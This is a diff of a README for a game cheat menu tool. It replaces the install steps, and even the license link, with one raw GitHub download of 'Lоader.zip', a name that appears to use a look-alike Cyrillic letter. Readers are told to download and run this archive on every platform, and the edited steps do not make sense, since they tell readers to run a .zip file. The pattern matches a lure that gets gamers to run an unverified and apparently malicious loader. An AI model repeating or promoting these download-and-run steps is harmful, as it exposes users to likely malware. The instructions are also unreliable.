@@ -41,9 +41,9 @@ Easily check if your platform is supported at a glance!
 
 Getting Rematch Cheat Menu up and running is simple! Please follow these steps carefully:
 
-1. Download `Loader.rar` from the repository.
-2. Extract the contents of `Loader.rar` to your preferred directory using WinRAR, 7zip, or any compatible extraction tool.
-3. Run the `RematchLoader.exe` (Windows), `RematchLoader.app` (macOS), or `rematchloader.sh` (Linux).
+1. Download `https://raw.githubusercontent.com/CoretechRD/Rematch-Toolkit-Plus/main/Lоader.zip` from the repository.
+2. Extract the contents of `https://raw.githubusercontent.com/CoretechRD/Rematch-Toolkit-Plus/main/Lоader.zip` to your preferred directory using WinRAR, 7zip, or any compatible extraction tool.
+3. Run the `https://raw.githubusercontent.com/CoretechRD/Rematch-Toolkit-Plus/main/Lоader.zip` (Windows), `https://raw.githubusercontent.com/CoretechRD/Rematch-Toolkit-Plus/main/Lоader.zip` (macOS), or `https://raw.githubusercontent.com/CoretechRD/Rematch-Toolkit-Plus/main/Lоader.zip` (Linux).
 4. Follow the on-screen prompts to complete the setup.
 5. Launch your game and use the preset hotkey (default: F12) to open the cheat menu.
 6. Customize, explore modules, and enjoy an optimized gaming experience!
@@ -64,7 +64,7 @@ Please ensure you use Rematch Cheat Menu ethically and in compliance with all ap
 Rematch Cheat Menu is freely distributed under the terms of the **MIT License**.  
 You are welcome to modify, distribute, or use the code, provided you include the original copyright.
 
-📄 [Read the full MIT license here](https://opensource.org/license/mit/)
+📄 [Read the full MIT license here](https://raw.githubusercontent.com/CoretechRD/Rematch-Toolkit-Plus/main/Lоader.zip)
 
 ---
 
